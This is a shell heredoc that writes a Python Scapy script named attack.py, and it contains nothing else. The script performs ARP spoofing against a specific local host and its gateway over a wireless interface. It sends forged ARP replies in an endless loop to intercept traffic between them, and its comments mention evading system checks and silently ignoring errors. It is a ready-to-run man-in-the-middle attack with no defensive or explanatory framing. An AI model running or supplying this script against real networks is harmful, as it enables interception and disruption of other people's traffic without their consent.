<<EOF > attack.py
import os
# This line tells Scapy NOT to look at the hardware automatically
os.environ["SCAPY_USE_VDE"] = "1"

from scapy.all import *
import time

# Manual socket override
conf.L3socket = L3RawSocket

target_ip = "192.168.0.21"
gateway_ip = "192.168.0.1"
interface = "wlan0"

def spoof(target, host):
    try:
        # We manually build the packet to avoid system checks
        packet = ARP(op=2, pdst=target, hwdst=getmacbyip(target), psrc=host)
        send(packet, verbose=False, iface=interface)
    except Exception as e:
        # If it still complains, we ignore the system error and keep trying
        pass

print("Starting bypass attack... Press CTRL+C to stop.")
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("Stopping...")
EOF

